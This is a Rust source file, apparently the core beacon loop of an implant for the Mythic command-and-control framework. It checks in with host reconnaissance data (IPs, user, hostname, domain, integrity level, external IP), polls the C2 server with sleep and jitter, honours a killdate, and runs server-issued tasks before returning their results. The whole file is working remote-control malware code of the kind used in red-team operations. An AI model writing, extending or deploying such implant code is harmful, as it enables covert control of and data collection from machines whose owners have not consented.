use core::sync::atomic::Ordering;
use std::thread::sleep;
use std::time::Duration;

use mythic::{
    AgentMessageExtras, C2Transport, MythicAgent, MythicError, MythicResult, RespGetTasking,
    TaskResponse,
};
use rand::seq::SliceRandom;
use uuid::Uuid;

use crate::config::Config;
use crate::sys::metadata;
use crate::tasks;
use crate::{set_killdate, set_sleep, DEBUG, INTERVAL, JITTER, KILLDATE, SHOULD_EXIT};

// ── Helpers ─────────────────────────────────────────────

fn get_agent<C: C2Transport>(payload_uuid: Uuid, c2s: &[C]) -> MythicResult<MythicAgent> {
    for c2 in c2s {
        if let Ok(agent) = MythicAgent::easy_checkin(
            payload_uuid,
            c2,
            metadata::local_ips(),
            metadata::os(),
            metadata::user(),
            metadata::hostname(),
            metadata::pid(),
            metadata::arch(),
            metadata::domain(),
            metadata::integrity_level(),
            metadata::external_ip(),
            None,
            None,
            metadata::process_name(),
        ) {
            return Ok(agent);
        }
    }
    Err(MythicError::InvalidPacket)
}

fn get_tasking_with<C: C2Transport>(
    mythic: &MythicAgent,
    task_size: u32,
    c2: &C,
    responses: Vec<TaskResponse>,
) -> MythicResult<RespGetTasking> {
    let extras = AgentMessageExtras {
        responses,
        ..Default::default()
    };
    mythic.get_tasking_with(task_size, c2, extras)
}

fn flush_pending<C: C2Transport>(mythic: &MythicAgent, c2: &C, pending: Vec<TaskResponse>) {
    if !pending.is_empty() {
        println!("[*] flushing {} response(s) before exit", pending.len());
        if let Err(e) = get_tasking_with(mythic, 5, c2, pending) {
            eprintln!("[!] flush failed: {e}");
        }
    }
}

fn sleep_with_jitter() {
    let interval = INTERVAL.load(Ordering::Acquire);
    let jitter = JITTER.load(Ordering::Acquire);
    if interval == 0 {
        return;
    }
    sleep(Duration::from_secs(interval));
    if jitter > 0 {
        let extra = (jitter as f64 * rand::random::<f64>()) as u64;
        sleep(Duration::from_secs(extra));
    }
}

fn past_killdate() -> bool {
    let kd = KILLDATE.load(Ordering::Acquire);
    if kd == 0 {
        return false;
    }
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();
    now > kd
}

fn parse_killdate_ts(s: &str) -> u64 {
    match chrono::NaiveDate::parse_from_str(s, "%Y-%m-%d") {
        Ok(d) => d
            .and_hms_opt(0, 0, 0)
            .map(|dt| dt.and_utc().timestamp() as u64)
            .unwrap_or(0),
        Err(_) => 0,
    }
}

// ── Main loop ───────────────────────────────────────────

pub fn run(config: Config) -> MythicResult<()> {
    let payload_uuid = config.payload_uuid;
    println!("[*] Agent start, payload_uuid={}", payload_uuid);

    let profiles = config.c2_profiles;
    let mythic = get_agent(payload_uuid, &profiles)?;

    set_sleep(
        profiles[0].callback_interval(),
        Some(profiles[0].callback_jitter()),
    );

    if let Some(ref kd) = profiles[0].killdate() {
        let ts = parse_killdate_ts(kd);
        if ts > 0 {
            set_killdate(ts);
            if past_killdate() {
                println!("[*] past killdate ({kd}), exiting");
                return Ok(());
            }
        }
    }

    let mut rng = rand::thread_rng();
    let mut pending: Vec<TaskResponse> = Vec::new();

    // First round: jitter then pure get_tasking
    sleep_with_jitter();
    let c2 = profiles.choose(&mut rng).unwrap();
    let tasking = get_tasking_with(&mythic, 5, c2, Vec::new())?;
    if DEBUG.load(Ordering::Relaxed) {
        println!("task: {:?}", tasking);
    }
    for t in &tasking.tasks {
        pending.push(tasks::dispatch(t));
    }
    if SHOULD_EXIT.load(Ordering::Acquire) {
        let c2 = profiles.choose(&mut rng).unwrap();
        flush_pending(&mythic, c2, pending);
        println!("[*] agent exited (thread)");
        return Ok(());
    }

    loop {
        // Check killdate each cycle
        if past_killdate() {
            println!("[*] past killdate, exiting");
            let c2 = profiles.choose(&mut rng).unwrap();
            flush_pending(&mythic, c2, pending);
            return Ok(());
        }

        sleep_with_jitter();
        let c2 = profiles.choose(&mut rng).unwrap();

        let batch: Vec<_> = pending.drain(..).collect();
        match get_tasking_with(&mythic, 5, c2, batch.clone()) {
            Ok(tasking) => {
                if DEBUG.load(Ordering::Relaxed) {
                    println!("task: {:?}", tasking);
                }
                for t in &tasking.tasks {
                    pending.push(tasks::dispatch(t));
                }
                if SHOULD_EXIT.load(Ordering::Acquire) {
                    let c2 = profiles.choose(&mut rng).unwrap();
                    flush_pending(&mythic, c2, pending);
                    println!("[*] agent exited (thread)");
                    return Ok(());
                }
            }
            Err(e) => {
                eprintln!("[!] get_tasking failed: {e}");
                pending.extend(batch);
                sleep(Duration::from_secs(5));
            }
        }
    }
}
